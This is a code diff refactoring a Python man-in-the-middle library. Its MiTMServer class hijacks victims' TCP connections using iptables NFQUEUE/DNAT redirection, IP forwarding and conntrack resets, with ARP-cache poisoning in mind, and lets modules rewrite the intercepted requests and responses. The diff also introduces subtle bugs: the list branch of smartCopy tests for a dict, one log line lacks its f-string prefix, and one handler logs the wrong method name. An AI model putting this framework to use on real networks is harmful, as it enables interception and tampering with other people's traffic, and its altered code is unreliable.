@@ -34,21 +34,22 @@ import netifaces
 from multiprocessing import Manager
 import queue
 import copy
-import os
 from threading import Thread
 from binascii import hexlify
+import shlex
 
 VERSION = "1.0.0"
 
+
 # A small struct/class to more easily manage existing/new connections
 class Connection(object):
-	def __init__(self, client_ip = "", server_ip = "", client_port = 0, server_port = 0, protocol = "TCP", interface = ""):
-		self.client_ip 		= client_ip
-		self.server_ip 		= server_ip
-		self.client_port 	= client_port
-		self.server_port 	= server_port
-		self.protocol 		= protocol.lower()
-		self.interface 		= interface
+	def __init__(self, client_ip="", server_ip="", client_port=0, server_port=0, protocol="TCP", interface=""):
+		self.client_ip = client_ip
+		self.server_ip = server_ip
+		self.client_port = client_port
+		self.server_port = server_port
+		self.protocol = protocol.lower()
+		self.interface = interface
 
 	# This returns just the source address & port in a string format
 	# so that it can be hashed and tied back to the connectionManager.
@@ -60,19 +61,15 @@ class Connection(object):
 	# object from the connectionManager - and thus - have the destination ip and port
 	# to then behave like a fully transparent TCP/UDP MiTM server.
 	def getMark(self):
-		return "[" + str(self.protocol.upper()) + "] " + str(self.client_ip) + ":" + str(self.client_port)
+		return f"[{self.protocol.upper()}] {self.client_ip}:{self.client_port}"
 
 	def __eq__(self, other):
-		# client to server
-		if(self.client_ip == other.client_ip): 
-			if(self.server_ip == other.server_ip): 
-				if(self.client_port == other.client_port): 
-					if(self.server_port == other.server_port): 
-						return True
-		return False
+		return self.client_ip == other.client_ip and self.server_ip == other.server_ip \
+			and self.client_port == other.client_port and self.server_port == other.server_port
 
 	def __str__(self):
-		return "[" + str(self.protocol.upper()) + "] " + str(self.client_ip) + ":" + str(self.client_port) + " -> " + str(self.server_ip) + ":" + str(self.server_port)
+		return f"[{self.protocol.upper()}] {self.client_ip}:{self.client_port} -> {self.server_ip}:{self.server_port}"
+
 
 # MiTMServer - A fully modular and transparent UDP/TCP proxy server that leverages nfqueue and iptables to run mitm attacks
 #	Usage:
@@ -91,57 +88,56 @@ class MiTMServer(Thread):
 	#	[bool] 		newInstance - 	T/F on if each new connection should be handled by 
 	#								a new instance of the MiTMModule passed, or (false) if all 
 	#								connections should be handled by the same instance. 
-	def __init__(self, port, protocol, iface, mitmInstance, newInstance = False):
+	def __init__(self, port, protocol, iface, mitmInstance, newInstance=False):
 		logging.getLogger(__name__).addHandler(logging.NullHandler())
 		self.logger = logging.getLogger(__name__)
 		self.logger.setLevel(logging.ERROR)
 
-		self.port 				= int(port)
-		self.protocol 			= protocol.upper()
-		self.interface			= iface
-		self.mitmInstance 		= mitmInstance
-		self.myIp 				= netifaces.ifaddresses(self.interface)[2][0]['addr']
+		self.port = int(port)
+		self.protocol = protocol.upper()
+		self.interface = iface
+		self.mitmInstance = mitmInstance
+		self.myIp = netifaces.ifaddresses(self.interface)[2][0]['addr']
 
-		self.newInstance 		= newInstance # Every new connection should/should not be handled by a new copy of the mitmInstance
+		# Every new connection should/should not be handled by a new copy of the mitmInstance
+		self.newInstance = newInstance
 
-		if(self.protocol.upper() == "TCP"):
+		if self.protocol.upper() == "TCP":
 			self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		else:
 			self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-		
+
 		self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 		self.sock.bind((self.myIp, self.port))
 
 		z = Manager()
-		self.connectionManager 	= z.dict()
-		self.iptablesFlag 		= "MiTMServer_" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(12))
-		self.nfqueueNum 		= random.randint(2000, 9999)
-		self.nfqueueThread 		= threading.Thread(target = self.nfqueueBinder)
+		self.connectionManager = z.dict()
+		self.iptablesFlag = "MiTMServer_" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(12))
+		self.nfqueueNum = random.randint(2000, 9999)
+		self.nfqueueThread = threading.Thread(target=self.nfqueueBinder)
 
-		self.myThreads 			= []
+		self.myThreads = []
 
-		super(MiTMServer, self).__init__()
-		pass
+		super().__init__()
 	
 	# Deep copy data and/or objects, with exceptions of shared-memory-objects like proxydicts (which get shallow copied)
 	def smartCopy(self, data):
-		if(type(data) == dict):
+		if isinstance(data, dict):
 			newDict = dict()
-			for key, item in data.iteritems():
+			for key, item in data.items():
 				newDict[key] = self.smartCopy(item)
 			return newDict
-		if(type(data) == list):
-			newLs = []
+		
+		if isinstance(data, dict):
+			newList = []
 			for item in data:
-				newLs.append(self.smartCopy(item))
-			return newLs
+				newList.append(self.smartCopy(item))
+			return newList
 
 		retData = None
 		try:
-			# 
-			if(type(data) == multiprocessing.Manager().dict()): raise(Exception(""))
-			# 
-			if(type(data) == threading.Lock()): raise(Exception(""))
+			if isinstance(data, (type(Manager().dict()), threading.Lock)):
+				raise Exception("")
 			retData = copy.deepcopy(data)
 		except:
 			try:
@@ -152,7 +148,7 @@ class MiTMServer(Thread):
 	
 	# Prep the firewall for NFqueue + redirection with arp-cache poisoning in mind
 	def openFirewall(self):
-		self.logger.debug("[ebcLib.py] Modifying firewall rules for "+self.protocol + "/" + str(self.port)+" attack")
+		self.logger.debug(f"[ebcLib.py] Modifying firewall rules for {self.protocol}/{self.port} attack")
 		cmds = []
 
 		# Set up IP forwarding
@@ -160,106 +156,107 @@ class MiTMServer(Thread):
 		# Disable sending redirects
 		cmds.append("echo 0 | tee /proc/sys/net/ipv4/conf/*/send_redirects")
 		# Allow forwarding through the firewall
-		cmds.append("iptables -A FORWARD -m comment --comment " + self.iptablesFlag + " -j ACCEPT")
+		cmds.append(f"iptables -A FORWARD -m comment --comment {self.iptablesFlag} -j ACCEPT")
 
 		# Nfqueue intercepts every NEW connection and 
 		# processes it with nfqueueHandler before 
 		# passing it on to the actual mitmInstance server
-		cmds.append("iptables -t nat -A PREROUTING" + \
-					" -i " + self.interface + \
-					" -p " + self.protocol.lower() + \
-					" --dport " + str(self.port) + \
-					" -m mark ! --mark " + str(self.nfqueueNum) + \
-					" -m conntrack --ctstate NEW" + \
-					" -j NFQUEUE --queue-num " + str(self.nfqueueNum) + \
-					" -m comment --comment " + self.iptablesFlag)
+		cmds.append(f"iptables -t nat -A PREROUTING" \
+					f" -i {self.interface}" \
+					f" -p {self.protocol.lower()}" \
+					f" --dport {self.port}" \
+					f" -m mark ! --mark {self.nfqueueNum}" \
+					f" -m conntrack --ctstate NEW" \
+					f" -j NFQUEUE --queue-num {self.nfqueueNum}" \
+					f" -m comment --comment {self.iptablesFlag}")
 
 		# After nfqueue is done with it, it gets passed 
 		# to the MiTMServer.listen() method
-		cmds.append("iptables -t nat -A PREROUTING" + \
-					" -i " + self.interface + \
-					" -p " + self.protocol.lower() + \
-					" --dport " + str(self.port) + \
-					" -j DNAT --to " + self.myIp + ":" + str(self.port) + \
-					" -m comment --comment " + self.iptablesFlag)
+		cmds.append(f"iptables -t nat -A PREROUTING" \
+					f" -i {self.interface}" \
+					f" -p {self.protocol.lower()}" \
+					f" --dport {self.port}" \
+					f" -j DNAT --to {self.myIp}:{self.port}" \
+					f" -m comment --comment {self.iptablesFlag}")
 
 		# Accept the routed packets to the MiTMServer.listen()
 		# function, which will then start a thread of the listenToClient
 		# function to 'be in charge' of this connection and directly handle 
 		# every subsequent message until the connection is closed
-		cmds.append("iptables -A INPUT" + \
-					" -i " + self.interface + \
-					" -p " + self.protocol.lower() + \
-					" --dport " + str(self.port) + \
-					" -m comment --comment " + self.iptablesFlag + \
-					" -j ACCEPT")
+		cmds.append(f"iptables -A INPUT" \
+					f" -i {self.interface}" \
+					f" -p {self.protocol.lower()}" \
+					f" --dport {self.port}" \
+					f" -m comment --comment {self.iptablesFlag}" \
+					f" -j ACCEPT")
 
 		# Masquerade our IP when we reply to the victim
-		cmds.append("iptables -t nat -I POSTROUTING -s 0/0 -j MASQUERADE -m comment --comment " + self.iptablesFlag)
+		cmds.append(f"iptables -t nat -I POSTROUTING -s 0/0 -j MASQUERADE -m comment --comment {self.iptablesFlag}")
 
 		# Reset any existing connections so that they get picked up by our intercept
-		cmds.append("conntrack -D -p " + self.protocol.upper() + " --sport " + str(self.port))
-		cmds.append("conntrack -D -p " + self.protocol.upper() + " --dport " + str(self.port))
+		cmds.append(f"conntrack -D -p {self.protocol.upper()} --sport {self.port}")
+		cmds.append(f"conntrack -D -p {self.protocol.upper()} --dport {self.port}")
 
 		# Run all of the commands spelled out above
 		for z in cmds:
-			self.logger.debug("[ebcLib.py] Running command: " + z)
-			c = subprocess.Popen(z.split(" "), stdout = subprocess.PIPE, stderr = subprocess.PIPE)
-			c.communicate()
+			self.logger.debug(f"[ebcLib.py] Running command: {z}")
+			c = subprocess.Popen(shlex.split(z), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+			c.communicate()  # TODO: Maybe remove?
 	
 	# Roll back our firewall changes
 	def closeFirewall(self):
-		self.logger.info("[ebcLib.py] Removing firewall rules from "+self.protocol + "/" + str(self.port)+" attack")
+		self.logger.info(f"[ebcLib.py] Removing firewall rules from {self.protocol}/{self.port} attack")
 		cmds = []
 
 		# Undo everything from the MiTMServer.openFirewall function
-		cmds.append("iptables -D FORWARD -m comment --comment " + self.iptablesFlag + " -j ACCEPT")
+		cmds.append(f"iptables -D FORWARD -m comment --comment {self.iptablesFlag} -j ACCEPT")
 
 		# Undo everything from the MiTMServer.openFirewall function
-		cmds.append("iptables -t nat -D PREROUTING" + \
-					" -i " + self.interface + \
-					" -p " + self.protocol + \
-					" --dport " + str(self.port) + \
-					" -m mark ! --mark " + str(self.nfqueueNum) + \
-					" -m conntrack --ctstate NEW" + \
-					" -j NFQUEUE --queue-num " + str(self.nfqueueNum) + \
-					" -m comment --comment " + self.iptablesFlag)
+		cmds.append(f"iptables -t nat -D PREROUTING" \
+					f" -i {self.interface}" \
+					f" -p {self.protocol.lower()}" \
+					f" --dport {self.port}" \
+					f" -m mark ! --mark {self.nfqueueNum}" \
+					f" -m conntrack --ctstate NEW" \
+					f" -j NFQUEUE --queue-num {self.nfqueueNum}" \
+					f" -m comment --comment {self.iptablesFlag}")
 
 		# Undo everything from the MiTMServer.openFirewall function
-		cmds.append("iptables -t nat -D PREROUTING" + \
-					" -i " + self.interface + \
-					" -p " + self.protocol + \
-					" --dport " + str(self.port) + \
-					" -j DNAT --to " + self.myIp + ":" + str(self.port) + \
-					" -m comment --comment " + self.iptablesFlag)
+		cmds.append(f"iptables -t nat -D PREROUTING" \
+					f" -i {self.interface}" \
+					f" -p {self.protocol.lower()}" \
+					f" --dport {self.port}" \
+					f" -j DNAT --to {self.myIp}:{self.port}" \
+					f" -m comment --comment {self.iptablesFlag}")
 
 		# Undo everything from the MiTMServer.openFirewall function
-		cmds.append("iptables -D INPUT" + \
-					" -i " + self.interface + \
-					" -p " + self.protocol.lower() + \
-					" --dport " + str(self.port) + \
-					" -m comment --comment " + self.iptablesFlag + \
-					" -j ACCEPT")
+		cmds.append(f"iptables -D INPUT" \
+					f" -i {self.interface}" \
+					f" -p {self.protocol.lower()}" \
+					f" --dport {self.port}" \
+					f" -m comment --comment {self.iptablesFlag}" \
+					f" -j ACCEPT")
 
 		# Undo everything from the MiTMServer.openFirewall function
-		cmds.append("iptables -t nat -D POSTROUTING -s 0/0 -j MASQUERADE -m comment --comment " + self.iptablesFlag)
+		cmds.append(f"iptables -t nat -D POSTROUTING -s 0/0 -j MASQUERADE -m comment --comment {self.iptablesFlag}")
 
 		# Run the commands
 		for z in cmds:
-			self.logger.debug("[ebcLib.py] Running command: " + z)
-			c = subprocess.Popen(z.split(" "), stdout = subprocess.PIPE, stderr = subprocess.PIPE)
-			c.communicate()
-		self.logger.debug("[ebcLib.py] Firewall restored from "+self.protocol + "/" + str(self.port)+" attack")
+			self.logger.debug(f"[ebcLib.py] Running command: {z}")
+			c = subprocess.Popen(shlex.split(z), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+			c.communicate()  # TODO: Maybe remove?
+		self.logger.debug(f"[ebcLib.py] Firewall restored from {self.protocol}/{self.port} attack")
 	
 	# This recieves the new connections from the victim - 
 	# and grabs the dest ip & dest port & passes it on to the intercept servers
 	# allowing for transparency
 	def nfqueueHandler(self, packet):
-		pkt 	= IP(packet.get_payload()) 			#Converts the raw packet to a scapy object
-		target 	= pkt.dst
-		victim 	= pkt.src
-		nc 		= Connection(pkt.src, pkt.dst, pkt[self.protocol].sport, pkt[self.protocol].dport, self.protocol, self.interface) 
-		key 	= hash(str(nc.getMark()))
+		pkt = IP(packet.get_payload())  # Converts the raw packet to a scapy object
+		target = pkt.dst
+		victim = pkt.src
+		nc = Connection(pkt.src, pkt.dst, pkt[self.protocol].sport,
+		                pkt[self.protocol].dport, self.protocol, self.interface)
+		key = hash(nc.getMark())
 		self.connectionManager[key] = nc
 
 		# Mark the packet so nfqueue won't touch it on the next iteration
@@ -268,7 +265,6 @@ class MiTMServer(Thread):
 		# let's have the kernel present the packet to us again as if it were new. 
 		# This time NFqueue won't touch it, and it will be passed to the intercept servers
 		packet.repeat()
-		return
 
 	# This gets seperated off into a thread, it runs nfqueue
 	# which is the most critical part. Without it, the proxy
@@ -290,19 +286,19 @@ class MiTMServer(Thread):
 			self.nfqueueThread.daemon = True
 			self.nfqueueThread.start()
 			# Start up the TCP intercept server
-			if(self.protocol == "TCP"):
+			if self.protocol == "TCP":
 				self.sock.listen(5)
-				self.logger.info("[ebcLib.py] Started " + self.protocol + "/" + str(self.port) + " intercept server")
+				self.logger.info(f"[ebcLib.py] Started {self.protocol}/{self.port} intercept server")
 				while True:
 					client, address = self.sock.accept()
 					client.settimeout(60)
 					self.myThreads.append(threading.Thread(target = self.victimHandler, args = (client, address)))
 					self.myThreads[-1].daemon = True
 					self.myThreads[-1].start()
-			'''
-			# TODO: Add UDP support
-			if(self.protocol == "UDP"):
-				self.logger.info("Starting " + self.protocol + "/" + str(self.port) + " intercept server...")
+			elif self.protocol == "UDP":
+				# TODO: Add UDP support
+				"""
+				self.logger.info(f"Starting {self.protocol}/{self.port} intercept server...")
 				while True:
 					data, address = self.sock.recvfrom()
 					# Check if nfqueue was able to grab the important info
@@ -313,11 +309,9 @@ class MiTMServer(Thread):
 						continue
 					resp = self.mitmInstance.run_mitm(data)
 					self.sock.sendto(resp, (address[0], address[1]))
-			'''	
+				"""
 		except KeyboardInterrupt:
 			self.logger.debug("[ebcLib.py] Shutting down......")
-			self.shutdown()
-			return
 		self.shutdown()
 		return
 	
@@ -325,7 +319,6 @@ class MiTMServer(Thread):
 	# handled in its own thread
 	def victimHandler(self, client, address):
 		try:
-			size = 9999
 			mitmObject = self.mitmInstance
 			# Check if nfqueue was able to grab the dest address & dest port info
 			nc = Connection(str(address[0]), '', int(address[1]), '', self.protocol, self.interface)
@@ -333,30 +326,32 @@ class MiTMServer(Thread):
 			if key not in self.connectionManager:
 				self.logger.debug("[ebcLib.py] Connection was not found in nfqueue populated dict")
 				return False
-			else:
-				self.logger.info("[ebcLib.py] Hijacked " + self.protocol.upper() + " connection between " + str(self.connectionManager[key]))
+			
+			self.logger.info(f"[ebcLib.py] Hijacked {self.protocol.upper()} connection between {self.connectionManager[key]}")
 
 			# If a new instance should be used in each new connection, 
 			# then create a new deepcopy of the original un-touched mitmInstance
-			if self.newInstance == True:
-				mitmObject = self.mitmInstance.__class__() 
+			if self.newInstance:
+				mitmObject = type(self.mitmInstance)() 
 				for member in dir(self.mitmInstance):
 					if not callable(getattr(self.mitmInstance, member)) and not member.startswith("__"):
 						setattr(mitmObject, str(member), self.smartCopy(getattr(self.mitmInstance, member)))		
 
 			# Provide the mitmObject with all of the data it needs to perform the attack
-			mitmObject.MiTMModuleConfig['Connection'] 			= self.connectionManager[key]
-			mitmObject.MiTMModuleConfig['clientRequestQueue'] 	= queue.Queue()
-			mitmObject.MiTMModuleConfig['hackedRequestQueue'] 	= queue.Queue()
-			mitmObject.MiTMModuleConfig['serverResponseQueue'] 	= queue.Queue()
-			mitmObject.MiTMModuleConfig['hackedResponseQueue'] 	= queue.Queue()
+			mitmObject.MiTMModuleConfig['Connection'] = self.connectionManager[key]
+			mitmObject.MiTMModuleConfig['clientRequestQueue'] = queue.Queue()
+			mitmObject.MiTMModuleConfig['hackedRequestQueue'] = queue.Queue()
+			mitmObject.MiTMModuleConfig['serverResponseQueue'] = queue.Queue()
+			mitmObject.MiTMModuleConfig['hackedResponseQueue'] = queue.Queue()
 
 			# These exist for connections where the data does not have a 1:1 ratio of send to recieve
 			# ie. the client sends 1 request and the server sends two replies
-			theListener = ASyncReciever(client, mitmObject.MiTMModuleConfig['clientRequestQueue'], self.connectionManager[key])
-			theSender 	= ASyncSender(client, mitmObject.MiTMModuleConfig['hackedResponseQueue'], self.connectionManager[key])
-			theListener.daemon 	= True
-			theSender.daemon 	= True
+			theListener = ASyncReciever(
+				client, mitmObject.MiTMModuleConfig['clientRequestQueue'], self.connectionManager[key])
+			theSender = ASyncSender(
+				client, mitmObject.MiTMModuleConfig['hackedResponseQueue'], self.connectionManager[key])
+			theListener.daemon = True
+			theSender.daemon = True
 			theSender.start()
 			theListener.start()
 
@@ -366,9 +361,6 @@ class MiTMServer(Thread):
 				while theListener.isAlive():
 					# theListener disregards '-1', so this join does nothing
 					theListener.join(-1)
-			except KeyboardInterrupt:
-				theListener.join(0)
-				theSender.join(0)
 			except:
 				theListener.join(0)
 				theSender.join(0)
@@ -378,12 +370,10 @@ class MiTMServer(Thread):
 				theListener.join(0)
 			if theSender is not None and theSender.isAlive():
 				theSender.join(0)
-		return
 
 	# Reset the firewall, kill the threads, etc
 	def shutdown(self):
 		self.closeFirewall()
-		return
 
 	# Called by the parent Thread class "start" function
 	def run(self):
@@ -395,12 +385,13 @@ class MiTMServer(Thread):
 		if timeout == -1:
 			return
 		self.shutdown()
-		super(MiTMServer, self).join(timeout)
+		super().join(timeout)
 
 
 # Split the data returned into 1500 byte chunks to prevent python from crashing
-def splitData(data, length = 1500):
-	return (data[0+i:length+i] for i in range(0, len(data), length))
+def splitData(data, length=1500):
+	return (data[0 + i:length + i] for i in range(0, len(data), length))
+
 
 class ASyncSender(Thread):
 	def __init__(self, client, serverResponseQueue, connectionInfo):
@@ -409,24 +400,21 @@ class ASyncSender(Thread):
 		self.client = client
 		self.serverResponseQueue = serverResponseQueue
 		self.connInfo = connectionInfo
-		super(ASyncSender, self).__init__()
+		super().__init__()
 
 	def sendToClient(self):
 		while True:
 			try:
 				data = self.serverResponseQueue.get()
-				if(data == None or len(data) == 0):
+				if data == None or len(data) == 0:
 					continue
 				self.client.sendall(data)
-			except KeyboardInterrupt:
-				self.client.close()
-				return False
-				break
 			except Exception as e:
-				# self.logger.info("[ASyncSender::sendToClient] " + str(e) + traceback.format_exc())
-				self.logger.debug("[ebcLib.py] Victim disconnected: [END] " + str(self.connInfo))
+				if not isinstance(e, KeyboardInterrupt):
+					self.logger.debug(f"[ebcLib.py] Victim disconnected: [END] {self.connInfo}")
 				self.client.close()
 				return False
+	
 	def run(self):
 		self.sendToClient()
 
@@ -438,7 +426,9 @@ class ASyncSender(Thread):
 			self.client.close()
 		except Exception as e:
 			pass
-		super(ASyncSender, self).join(timeout)
+		super().join(timeout)
+
+
 class ASyncReciever(Thread):
 	def __init__(self, client, clientRequestQueue, connectionInfo):
 		logging.getLogger(__name__).addHandler(logging.NullHandler())
@@ -446,7 +436,8 @@ class ASyncReciever(Thread):
 		self.client = client
 		self.clientRequestQueue = clientRequestQueue
 		self.connInfo = connectionInfo
-		super(ASyncReciever, self).__init__()
+		super().__init__()
+	
 	def listenToClient(self):
 		while True:
 			try:
@@ -454,16 +445,15 @@ class ASyncReciever(Thread):
 				if(data == None or len(data) == 0):
 					continue
 				self.clientRequestQueue.put(data)
-			except KeyboardInterrupt:
-				self.client.close()
-				return False
-				break
 			except Exception as e:
-				self.logger.info("[ebcLib.py] Victim disconnected: [END] " + str(self.connInfo))
+				if not isinstance(e, KeyboardInterrupt):
+					self.logger.info("[ebcLib.py] Victim disconnected: [END] {self.connInfo}")
 				self.client.close()
 				return False
+	
 	def run(self):
 		self.listenToClient()
+	
 	def join(self, timeout=None):
 		if timeout == -1:
 			return
@@ -476,7 +466,7 @@ class ASyncReciever(Thread):
 			except:
 				pass
 			pass
-		super(ASyncReciever, self).join(timeout)
+		super().join(timeout)
 
 # MiTMModule - The backbone MiTMModule for the MiTMServer. To use it,
 # define a child class and then re-define only the parseClientRequest and parseServerResponse functions to fit your needs.
@@ -494,47 +484,44 @@ class MiTMModule(object):
 	# with the target server, then starts the threads for listening
 	# & sending
 	def run_mitm(self):
-
 		clientHandler = None
 		serverHandler = None
 		try:
 			if self.MiTMModuleConfig['Connection'].protocol == "udp":
 				self.NETClient = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 				return
-			elif self.MiTMModuleConfig['Connection'].protocol == "tcp":
-				NETClient	= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-				NETClient.connect((self.MiTMModuleConfig['Connection'].server_ip, self.MiTMModuleConfig['Connection'].server_port))
+			
+			if self.MiTMModuleConfig['Connection'].protocol == "tcp":
+				NETClient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+				NETClient.connect(
+					(self.MiTMModuleConfig['Connection'].server_ip, self.MiTMModuleConfig['Connection'].server_port))
 
-				sender 		= ASyncSender(NETClient, self.MiTMModuleConfig['hackedRequestQueue'], self.MiTMModuleConfig['Connection'])
-				listener 	= ASyncReciever(NETClient, self.MiTMModuleConfig['serverResponseQueue'], self.MiTMModuleConfig['Connection'])
+				sender = ASyncSender(
+					NETClient, self.MiTMModuleConfig['hackedRequestQueue'], self.MiTMModuleConfig['Connection'])
+				listener = ASyncReciever(
+					NETClient, self.MiTMModuleConfig['serverResponseQueue'], self.MiTMModuleConfig['Connection'])
 
-				listener.daemon 	= True
-				sender.daemon 		= True
+				listener.daemon = True
+				sender.daemon = True
 				listener.start()
 				sender.start()
 
-				clientHandler = Thread(target = self.threadListenForRequests)
-				serverHandler = Thread(target = self.threadListenForResponses)
-				
+				clientHandler = Thread(target=self.threadListenForRequests)
+				serverHandler = Thread(target=self.threadListenForResponses)
+
 				clientHandler.daemon = True
 				serverHandler.daemon = True
 
 				clientHandler.start()
 				serverHandler.start()
+
 				try:
-					if(clientHandler == None):
-						return
-					if(serverHandler == None):
-						return
 					while clientHandler.isAlive():
 						# theListener disregards '-1', so this join does nothing
 						clientHandler.join(-1)
-
-					
 					while serverHandler.isAlive():
 						# theListener disregards '-1', so this join does nothing
 						serverHandler.join(-1)
-
 				except KeyboardInterrupt:
 					clientHandler.join(0)
 					serverHandler.join(0)
@@ -542,12 +529,11 @@ class MiTMModule(object):
 			else:
 				raise Exception("Only SOCK_STREAM and SOCK_DGRAM are supported!")
 		except Exception as e:
-			# self.logger.error("[" + self.__class__.__name__ + "::run_mitm] " + str(e) + traceback.format_exc())
 			if clientHandler is not None and clientHandler.isAlive():
 				clientHandler.join(0)
 			if serverHandler is not None and serverHandler.isAlive():
 				serverHandler.join(0)
-		return
+			raise
 
 	def threadListenForRequests(self):
 		while True:
@@ -558,8 +544,8 @@ class MiTMModule(object):
 				for z in splitData(req):
 					self.MiTMModuleConfig['hackedRequestQueue'].put(z)
 			except Exception as e:
-			 	self.logger.error("[" + self.__class__.__name__ + "::threadListenForRequests] " + str(e) + " " + str(traceback.format_exc()))
-		pass
+			 	self.logger.error(f"[{type(self).__name__}::threadListenForRequests] {e} {traceback.format_exc()}")
+
 	def threadListenForResponses(self):
 		while True:
 			try:
@@ -569,20 +555,21 @@ class MiTMModule(object):
 				for z in splitData(resp):
 					self.MiTMModuleConfig['hackedResponseQueue'].put(z)
 			except Exception as e:
-				self.logger.error("[" + self.__class__.__name__ + "::threadListenForResponses] " + str(e) + " " + str(traceback.format_exc()))
-		pass
-	
+				self.logger.error(f"[{type(self).__name__}::threadListenForRequests] {e} {traceback.format_exc()}")
+
 	# Closes the connection and sets NETClient to None
 	def closeConnection(self):
 		if self.MiTMModuleConfig['protocol'] == socket.SOCK_STREAM:
 			self.NETClient.close()
 		self.NETClient = None
+	
 	# (optional) Use this after init to pass custom variables to the instance. Access them with 
 	# self.info['MyVarName']
 	def addCustomData(self, **kwargs):
 		# Add each piece of data to the global "info" dictionary 
 		for key in kwargs:
 			self.info[key] = kwargs[key]
+	
 	# (optional) Re-define this function and use it as a make-shift init(). This function will be called with no arguments
 	# once - right after the object is initalized. Use it to establish global variables and such for the instance.
 	def setup(self):
@@ -590,19 +577,21 @@ class MiTMModule(object):
 		#self.statefulVariable = "you get the idea"
 		#self.Useful = True #probably
 		pass
+	
 	# (required) This returns the hacked request that will be sent to the real server
 	def parseClientRequest(self, request):
 		# Override this function as a child class
 		raise Exception("[MiTMModule] This is not how to use the MiTMModule class! You must define a child class of it, and then re-define parseClientRequest and parseServerResponse")
 		return request
+	
 	# (required) Returns the hacked response sent to the real client
 	def parseServerResponse(self, response):
 		# Override this function as a child class
 		raise Exception("[MiTMModule] This is not how to use the MiTMModule class! You must define a child class of it, and then re-define parseClientRequest and parseServerResponse")
 		return response
+	
 	# Don't worry about any of this - all of this is filled in by the MiTMServer
 	def __init__(self):
-		
 		self.MiTMModuleConfig = dict()
 		# Trust me, leave this as None and let the initConnection and resetConnection methods
 		# handle this from inside the threads they run within 
@@ -611,7 +600,6 @@ class MiTMModule(object):
 
 		# Run the setup function, in the event it may have been re-defined
 		self.setup()
-		return
 
 
 # ExampleMod - an example of how to use the MiTMModule
@@ -620,7 +608,6 @@ class MiTMModule(object):
 #		return the replacement data for the packet which will be sent over to the legitimate destination.
 # 3. Profit
 class ExampleMod(MiTMModule):
-	
 	# Modify the data sent from the client to the server
 	def parseClientRequest(self, request):
 		print("Client request:\n" + hexlify(request))
